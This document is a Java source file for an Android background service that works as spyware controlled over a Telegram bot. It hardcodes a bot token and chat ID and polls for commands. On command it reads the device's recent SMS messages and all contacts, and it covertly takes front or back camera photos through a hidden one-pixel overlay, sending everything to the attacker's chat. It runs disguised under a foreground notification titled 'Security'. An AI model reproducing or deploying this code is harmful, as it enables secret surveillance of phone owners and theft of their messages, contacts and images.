package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class TelegramService extends Service {

    private static final String BOT_TOKEN = "8926467469:AAGvJFC7n2cIbTN5BD5vEhskqDR2AyuLLJ8";
    private static final String TARGET_CHAT_ID = "6208587432";

    private final ExecutorService executor = Executors.newFixedThreadPool(3);
    private int lastUpdateId = 0;
    private volatile boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundServiceNotification();
    }

    private void startForegroundServiceNotification() {
        String channelId = "bg_service_channel";
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Service", NotificationManager.IMPORTANCE_MIN);
            if (manager != null) manager.createNotificationChannel(channel);
        }
        Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                new Notification.Builder(this, channelId) : new Notification.Builder(this);
        startForeground(101, builder.setSmallIcon(android.R.drawable.sym_def_app_icon).setContentTitle("Security").build());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            executor.execute(this::startPolling);
        }
        return START_STICKY;
    }

    private void startPolling() {
        while (isRunning) {
            try {
                String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                if (conn.getResponseCode() == 200) {
                    InputStream in = conn.getInputStream();
                    ByteArrayOutputStream res = new ByteArrayOutputStream();
                    byte[] b = new byte[1024]; int l;
                    while ((l = in.read(b)) != -1) res.write(b, 0, l);
                    parseAndExecuteCommand(res.toString("UTF-8"));
                }
                conn.disconnect();
            } catch (Exception e) { try { Thread.sleep(5000); } catch (InterruptedException ignored) {} }
        }
    }

    private void parseAndExecuteCommand(String json) {
        try {
            JSONObject obj = new JSONObject(json);
            JSONArray arr = obj.getJSONArray("result");
            for (int i = 0; i < arr.length(); i++) {
                JSONObject update = arr.getJSONObject(i);
                lastUpdateId = update.getInt("update_id");
                if (update.has("message")) {
                    handleCommand(update.getJSONObject("message").optString("text", ""));
                }
            }
        } catch (Exception ignored) {}
    }

    private void handleCommand(String cmd) {
        if (cmd.equals("/ping")) sendTelegramMessage("✅ الهاتف نشط.");
        else if (cmd.equals("/sms")) sendTelegramMessage("📱 الرسائل:\n" + getLatestSms(5));
        else if (cmd.equals("/contacts")) sendTelegramMessage(getContacts());
        else if (cmd.equals("/photo")) captureAndSendPhoto(Camera.CameraInfo.CAMERA_FACING_FRONT);
        else if (cmd.equals("/photo_back")) captureAndSendPhoto(Camera.CameraInfo.CAMERA_FACING_BACK);
    }

    private void captureAndSendPhoto(int cameraId) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                Camera camera = Camera.open(cameraId);
                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                SurfaceView sv = new SurfaceView(this);
                int type = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1, type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT);
                sv.getHolder().addCallback(new SurfaceHolder.Callback() {
                    @Override public void surfaceCreated(SurfaceHolder h) {
                        try {
                            camera.setPreviewDisplay(h);
                            camera.startPreview();
                            camera.takePicture(null, null, (data, cam) -> {
                                executor.execute(() -> sendPhotoToTelegram(data));
                                new Handler(Looper.getMainLooper()).post(() -> { try { wm.removeView(sv); cam.release(); } catch (Exception ignored) {} });
                            });
                        } catch (Exception e) { wm.removeView(sv); camera.release(); }
                    }
                    @Override public void surfaceChanged(SurfaceHolder h, int f, int w, int h1) {}
                    @Override public void surfaceDestroyed(SurfaceHolder h) {}
                });
                wm.addView(sv, params);
            } catch (Exception e) { sendTelegramMessage("❌ تعذر الوصول للكاميرا."); }
        });
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder("📑 جهات الاتصال:\n");
        try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)) {
            if (c != null) {
                int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                while (c.moveToNext()) {
                    sb.append(c.getString(nameIdx)).append(": ").append(c.getString(numIdx)).append("\n");
                }
            }
        } catch (Exception e) { return "❌ خطأ في القراءة."; }
        return sb.length() > 20 ? sb.toString() : "لا توجد أسماء.";
    }

    private String getLatestSms(int limit) {
        StringBuilder sb = new StringBuilder("📱 الرسائل:\n");
        try (Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")) {
            if (c != null) {
                int count = 0;
                while (c.moveToNext() && count < limit) {
                    sb.append(c.getString(c.getColumnIndex("address"))).append(": ").append(c.getString(c.getColumnIndex("body"))).append("\n---\n");
                    count++;
                }
            }
        } catch (Exception e) { return "❌ خطأ في الرسائل."; }
        return sb.length() > 10 ? sb.toString() : "لا توجد رسائل.";
    }

    private void sendTelegramMessage(String text) {
        executor.execute(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String data = "chat_id=" + TARGET_CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes("UTF-8"));
                os.close();
                conn.getResponseCode();
            } catch (Exception ignored) {}
        });
    }

    private void sendPhotoToTelegram(byte[] data) {
        try {
            String boundary = "Boundary-" + System.currentTimeMillis();
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream out = new DataOutputStream(conn.getOutputStream());
            out.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + TARGET_CHAT_ID + "\r\n");
            out.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"p.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n");
            out.write(data);
            out.writeBytes("\r\n--" + boundary + "--\r\n");
            out.flush();
            out.close();
            conn.getResponseCode();
        } catch (Exception e) { sendTelegramMessage("❌ فشل إرسال الصورة: " + e.getMessage()); }
    }

    @Override public void onDestroy() { super.onDestroy(); isRunning = false; }
    @Override public IBinder onBind(Intent intent) { return null; }
}
